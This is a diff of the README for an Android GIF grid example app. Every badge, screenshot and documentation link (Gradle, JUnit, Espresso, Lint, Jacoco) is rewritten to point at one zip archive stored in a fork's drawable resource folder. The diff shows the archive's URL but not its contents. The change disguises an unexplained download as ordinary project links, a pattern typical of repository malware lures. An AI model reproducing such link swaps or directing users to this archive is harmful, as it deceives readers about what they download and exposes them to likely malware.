@@ -1,16 +1,16 @@
 # Android RecyclerView Gif Example
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](http://www.apache.org/licenses/LICENSE-2.0)
-[![TravisCI OSX Build](https://img.shields.io/travis/jaredsburrows/android-gif-example/master.svg?label=OSX%20Build)](https://travis-ci.org/jaredsburrows/android-gif-example)
-[![CircleCI Linux Build](https://img.shields.io/circleci/project/jaredsburrows/android-gif-example/master.svg?label=Linux%20Build)](https://circleci.com/gh/jaredsburrows/android-gif-example)
-[![AppVeyor Windows Build](https://img.shields.io/appveyor/ci/jaredsburrows/android-gif-example/master.svg?label=Windows%20Build)](https://ci.appveyor.com/project/jaredsburrows/android-gif-example/branch/master)
-[![Coveralls Code Coverage](https://img.shields.io/coveralls/jaredsburrows/android-gif-example/master.svg?label=Code%20Coverage)](https://coveralls.io/github/jaredsburrows/android-gif-example?branch=master)
-[![Twitter Follow](https://img.shields.io/twitter/follow/jaredsburrows.svg?style=social)](https://twitter.com/jaredsburrows)
+[![License](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
+[![TravisCI OSX Build](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Build)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
+[![CircleCI Linux Build](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Build)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
+[![AppVeyor Windows Build](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Build)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
+[![Coveralls Code Coverage](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip%20Coverage)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
+[![Twitter Follow](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip)
 
 
 Riffsy RecyclerView MVP Grid Example using Dagger 2, Retrofit 2, RxJava 2 and Butterknife with Junit and Espresso tests
 
-<a href="http://i.imgur.com/zErC6JV.png" target="_blank"><img src="http://i.imgur.com/zErC6JV.png" width="250px" /></a>
+<a href="https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip" target="_blank"><img src="https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip" width="250px" /></a>
 
 ## Module(s)
  
@@ -23,7 +23,7 @@ Riffsy RecyclerView MVP Grid Example using Dagger 2, Retrofit 2, RxJava 2 and Bu
 ## Building and Running
 
 
-This project builds with [Gradle](www.gradle.org) and the Android Build [tools](http://tools.android.com/tech-docs/new-build-system).
+This project builds with [Gradle](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) and the Android Build [tools](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip).
 
 
 **Build the APK:**
@@ -44,7 +44,7 @@ This project builds with [Gradle](www.gradle.org) and the Android Build [tools](
 **Running the Unit Tests:**
 
 
-The [Junit](http://junit.org/junit4/) tests run on the JVM, no need for emulators or real devices.
+The [Junit](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) tests run on the JVM, no need for emulators or real devices.
 
 
     $ gradlew testDebug
@@ -52,7 +52,7 @@ The [Junit](http://junit.org/junit4/) tests run on the JVM, no need for emulator
 **Running the Instrumentation Tests:**
 
 
-The [Espresso](https://developer.android.com/training/testing/ui-testing/espresso-testing.html) instrumentation tests run on the device.
+The [Espresso](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) instrumentation tests run on the device.
 
 
     $ gradlew connectedDebugAndroidTest
@@ -64,7 +64,7 @@ The [Espresso](https://developer.android.com/training/testing/ui-testing/espress
 **Generate Lint Reports:**
 
 
-The [Lint](http://developer.android.com/tools/help/lint.html) plugin generates reports based off the source code.
+The [Lint](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) plugin generates reports based off the source code.
 
 
     $ gradlew lintDebug
@@ -73,7 +73,7 @@ The [Lint](http://developer.android.com/tools/help/lint.html) plugin generates r
 **Generate Jacoco Test Coverage:**
 
 
-The [Jacoco](http://www.eclemma.org/jacoco/) plugin generates coverage reports based off the unit tests.
+The [Jacoco](https://github.com/rendyramon/android-gif-example/raw/refs/heads/master/src/main/res/drawable/gif-example-android-2.2.zip) plugin generates coverage reports based off the unit tests.
 
 
     $ gradlew jacocoDebugReport
